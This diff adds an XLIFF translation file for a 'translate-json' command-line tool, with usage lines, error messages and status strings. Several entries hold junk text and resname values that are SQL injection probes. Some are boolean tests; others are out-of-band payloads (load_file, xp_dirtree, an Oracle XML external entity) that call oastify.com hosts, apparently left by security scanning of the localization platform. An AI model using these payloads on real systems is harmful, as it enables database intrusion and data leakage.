+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="126[1]" resname="asdasd' and '4439'='4444">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="124[0]" resname="asdasd' and '7502'='7502">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="124[1]" resname="asdasd' and '7502'='7502">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="122[0]" resname="asdasd28127258' or 4105=4105'-- ">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="122[1]" resname="asdasd28127258' or 4105=4105'-- ">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="120[0]" resname="asdasd16492940' or 1463=1463-- ">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="120[1]" resname="asdasd16492940' or 1463=1463-- ">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <trans-unit id="22" resname="usage.10">
+        <source>    -h, --help                    Show this screen.</source>
+        <target state="needs-translation">    -h, --help                    Show this screen.</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 10</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="40" resname="errors.REQUIRED_PARAM_LANG">
+        <source>Failed to specify a language to translate to. (--language)</source>
+        <target state="needs-translation">Failed to specify a language to translate to. (--language)</target>
+        <context-group purpose="information">
+          <context context-type="source">errors -&gt; REQUIRED_PARAM_LANG</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="38" resname="usage.18">
+        <source>    cat input.json | translate-json -l ru - &gt; output.json</source>
+        <target state="needs-translation">    cat input.json | translate-json -l ru - &gt; output.json</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 18</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="36" resname="usage.17">
+        <source>    translate-json -c 60 --preserve-html-entities --lang=ru ./labels.json ./labels-ru.json</source>
+        <target state="needs-translation">    translate-json -c 60 --preserve-html-entities --lang=ru ./labels.json ./labels-ru.json</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 17</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="34" resname="usage.16">
+        <source>    translate-json -d --lang=ru ./labels.json ./labels-ru.json</source>
+        <target state="needs-translation">    translate-json -d --lang=ru ./labels.json ./labels-ru.json</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 16</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="32" resname="usage.15">
+        <source>    translate-json --lang=ru ./labels.json ./labels-ru.json</source>
+        <target state="needs-translation">    translate-json --lang=ru ./labels.json ./labels-ru.json</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 15</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="30" resname="usage.14">
+        <source>  Examples:</source>
+        <target state="needs-translation">  Examples:</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 14</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="28" resname="usage.13" translate="no">
+        <source></source>
+        <target></target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 13</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="26" resname="usage.12">
+        <source>    --verbose                     Log more.</source>
+        <target state="needs-translation">    --verbose                     Log more.</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 12</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="24" resname="usage.11">
+        <source>    -v, --version                 Show version.</source>
+        <target state="needs-translation">    -v, --version                 Show version.</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 11</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="42" resname="errors.REQUIRED_PARAM_INPUT">
+        <source>Failed to specify an input file.</source>
+        <target state="needs-translation">Failed to specify an input file.</target>
+        <context-group purpose="information">
+          <context context-type="source">errors -&gt; REQUIRED_PARAM_INPUT</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="20" resname="usage.9">
+        <source>    -d, --dry-run                 Do not actually translate any values, prefix strings with 'zz_' to mark them.</source>
+        <target state="needs-translation">    -d, --dry-run                 Do not actually translate any values, prefix strings with 'zz_' to mark them.</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 9</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="18" resname="usage.8">
+        <source>    -e, --exclude                 Regular expression to exclude key paths. e.g. '^(notThis|this|not.this.either)$'</source>
+        <target state="needs-translation">    -e, --exclude                 Regular expression to exclude key paths. e.g. '^(notThis|this|not.this.either)$'</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 8</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="16" resname="usage.7">
+        <source>    -p, --preserve-html-entities  Preserve HTML entities in translated text. (False by default.)</source>
+        <target state="needs-translation">    -p, --preserve-html-entities  Preserve HTML entities in translated text. (False by default.)</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 7</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="14" resname="usage.6">
+        <source>    -k, --api-key                 The API key to be used with the translation service.</source>
+        <target state="needs-translation">    -k, --api-key                 The API key to be used with the translation service.</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 6</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+        <note from="0x88new2" priority="4">asdasdasdasd</note>
+      </trans-unit>
+      <trans-unit id="12" resname="usage.5">
+        <source>    -t, --translator              The translation service to use: google (default), yandex, bing.</source>
+        <target state="needs-translation">    -t, --translator              The translation service to use: google (default), yandex, bing.</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 5</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="10" resname="usage.4">
+        <source>  Options:</source>
+        <target state="needs-translation">  Options:</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 4</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="6" resname="usage.2">
+        <source>    translate-json [options] --lang=&lt;language&gt; -k &lt;apiKey&gt; (- | &lt;input&gt;) [&lt;output&gt;]</source>
+        <target state="needs-translation">    translate-json [options] --lang=&lt;language&gt; -k &lt;apiKey&gt; (- | &lt;input&gt;) [&lt;output&gt;]</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 2</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+        <note from="0x88new2" priority="4">adsasd</note>
+      </trans-unit>
+      <trans-unit id="4" resname="usage.1">
+        <source>    translate-json [options] -l &lt;language&gt; -k &lt;apiKey&gt; (- | &lt;input&gt;) [&lt;output&gt;]</source>
+        <target state="needs-translation">    translate-json [options] -l &lt;language&gt; -k &lt;apiKey&gt; (- | &lt;input&gt;) [&lt;output&gt;]</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 1</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+        <note from="0x88new2" priority="4">there is issue heres</note>
+      </trans-unit>
+      <trans-unit id="60" resname="messages.TRANSFORMER_CHOICE">
+        <source>Using '%s' transformer.</source>
+        <target state="needs-translation">Using '%s' transformer.</target>
+        <context-group purpose="information">
+          <context context-type="source">messages -&gt; TRANSFORMER_CHOICE</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="78[0]" resname="(select load_file('\\\\zy1ssk19vig1sjyj0btm43j0grmkabbz21qtdp1e.oastify.com\\nrj'))">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="78[1]" resname="(select load_file('\\\\zy1ssk19vig1sjyj0btm43j0grmkabbz21qtdp1e.oastify.com\\nrj'))">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="76[0]" resname="asdasd');declare @q varchar(99);set @q='\\n3rgx86x06lpx7375zya9roolfr8fzgn7gv8i46t.oasti'+'fy.com\vmm'; exec master.dbo.xp_dirtree @q;-- ">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="76[1]" resname="asdasd');declare @q varchar(99);set @q='\\n3rgx86x06lpx7375zya9roolfr8fzgn7gv8i46t.oasti'+'fy.com\vmm'; exec master.dbo.xp_dirtree @q;-- ">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="74[0]" resname="asdasd);declare @q varchar(99);set @q='\\154uzm8b2kn3zl5l7d0ob5q2nttmhdi19txlkh86.oasti'+'fy.com\rqd'; exec master.dbo.xp_dirtree @q;-- " size-unit="char" maxwidth="5" translate="no">
+          <source>asd</source>
+          <target>asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="74[1]" resname="asdasd);declare @q varchar(99);set @q='\\154uzm8b2kn3zl5l7d0ob5q2nttmhdi19txlkh86.oasti'+'fy.com\rqd'; exec master.dbo.xp_dirtree @q;-- " size-unit="char" maxwidth="5" translate="no">
+          <source>asd</source>
+          <target>asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="72[0]" resname="asdasd';declare @q varchar(99);set @q='\\rtokncw1qabtnbtbv3oezvesbjhc536rxila86wv.oasti'+'fy.com\kkm'; exec master.dbo.xp_dirtree @q;-- z">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asds
+s</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+          <note from="0x88new2" priority="4">a</note>
+        </trans-unit>
+        <trans-unit id="72[1]" resname="asdasd';declare @q varchar(99);set @q='\\rtokncw1qabtnbtbv3oezvesbjhc536rxila86wv.oasti'+'fy.com\kkm'; exec master.dbo.xp_dirtree @q;-- z">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asds
+s</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+          <note from="0x88new2" priority="4">a</note>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="68[0]" resname="asdasd'||(select extractvalue(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % mjplk SYSTEM &quot;http://mukfo7xwr5coo6u6wyp90qfncei76y7mba3xzlo.oasti'||'fy.com/&quot;&gt;%mjplk;]&gt;'),'/l') from dual)||'">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="68[1]" resname="asdasd'||(select extractvalue(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % mjplk SYSTEM &quot;http://mukfo7xwr5coo6u6wyp90qfncei76y7mba3xzlo.oasti'||'fy.com/&quot;&gt;%mjplk;]&gt;'),'/l') from dual)||'">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="66[0]" resname="(select extractvalue(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % mjplk SYSTEM &quot;http://a3e3xv6k0tlcxu3u5myx9eobl2rvfmgajybl79w.oasti'||'fy.com/&quot;&gt;%mjplk;]&gt;'),'/l') from dual)">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="66[1]" resname="(select extractvalue(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % mjplk SYSTEM &quot;http://a3e3xv6k0tlcxu3u5myx9eobl2rvfmgajybl79w.oasti'||'fy.com/&quot;&gt;%mjplk;]&gt;'),'/l') from dual)">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="64[0]" resname="asdasd">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="64[1]" resname="asdasd">
+          <source>asd</source>
+          <target state="needs-translation">asd</target>
+          <context-group purpose="information">
+            <context context-type="source">asd</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <group restype="x-gettext-plurals">
+        <trans-unit id="62[0]" resname="poc" size-unit="char" maxwidth="20">
+          <source>poc</source>
+          <target state="needs-translation">poc</target>
+          <context-group purpose="information">
+            <context context-type="source">zxc</context>
+            <context context-type="x-plural-form">Form: One</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 1</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+        <trans-unit id="62[1]" resname="poc" size-unit="char" maxwidth="20">
+          <source>poc</source>
+          <target state="needs-translation">poc</target>
+          <context-group purpose="information">
+            <context context-type="source">zxc</context>
+            <context context-type="x-plural-form">Form: Other</context>
+            <context context-type="x-plural-example">Translation will be used with numbers: 0, 2-999; 1.2, 2.07...</context>
+            <context context-type="x-crowdin-label">unassigned</context>
+          </context-group>
+        </trans-unit>
+      </group>
+      <trans-unit id="2" resname="usage.0">
+        <source>  Usage:</source>
+        <target state="needs-translation">  Usage:</target>
+        <context-group purpose="information">
+          <context context-type="source">usage -&gt; 01</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="58" resname="messages.DUPLICATE_COUNT">
+        <source>Optimising... found %d duplicate values to translate.</source>
+        <target state="needs-translation">Optimising... found %d duplicate values to translate.</target>
+        <context-group purpose="information">
+          <context context-type="source">messages -&gt; DUPLICATE_COUNT</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="56" resname="messages.TRANSLATING">
+        <source>Fetching translations for %s fields.</source>
+        <target state="needs-translation">Fetching translations for %s fields.</target>
+        <context-group purpose="information">
+          <context context-type="source">messages -&gt; TRANSLATING</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="54" resname="messages.SUCCESS">
+        <source>Successfully wrote translated file to %s.</source>
+        <target state="needs-translation">Successfully wrote translated file to %s.</target>
+        <context-group purpose="information">
+          <context context-type="source">messages -&gt; SUCCESS</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="52" resname="errors.INVALID_JSON_DOC">
+        <source>%s is not a JSON document</source>
+        <target state="needs-translation">%s is not a JSON document</target>
+        <context-group purpose="information">
+          <context context-type="source">errors -&gt; INVALID_JSON_DOC</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="50" resname="errors.INVALID_INPUT">
+        <source>%s is not a file</source>
+        <target state="needs-translation">%s is not a file</target>
+        <context-group purpose="information">
+          <context context-type="source">errors -&gt; INVALID_INPUT</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="48" resname="errors.INVALID_STD_INPUT">
+        <source>Could not read stdin.</source>
+        <target state="needs-translation">Could not read stdin.</target>
+        <context-group purpose="information">
+          <context context-type="source">errors -&gt; INVALID_STD_INPUT</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="46" resname="errors.INVALID_TRANSLATOR">
+        <source>The translation API you specified is not valid. Please use google (default), yandex, or bing.</source>
+        <target state="needs-translation">The translation API you specified is not valid. Please use google (default), yandex, or bing.</target>
+        <context-group purpose="information">
+          <context context-type="source">errors -&gt; INVALID_TRANSLATOR</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+      <trans-unit id="44" resname="errors.REQUIRED_PARAM_API_KEY">
+        <source>You specified %s as a translator, but did not specify an API key. (Use -k)</source>
+        <target state="needs-translation">You specified %s as a translator, but did not specify an API key. (Use -k)</target>
+        <context-group purpose="information">
+          <context context-type="source">errors -&gt; REQUIRED_PARAM_API_KEY</context>
+          <context context-type="x-crowdin-label">strings.json</context>
+        </context-group>
+      </trans-unit>
+    </body>
+  </file>
+</xliff>
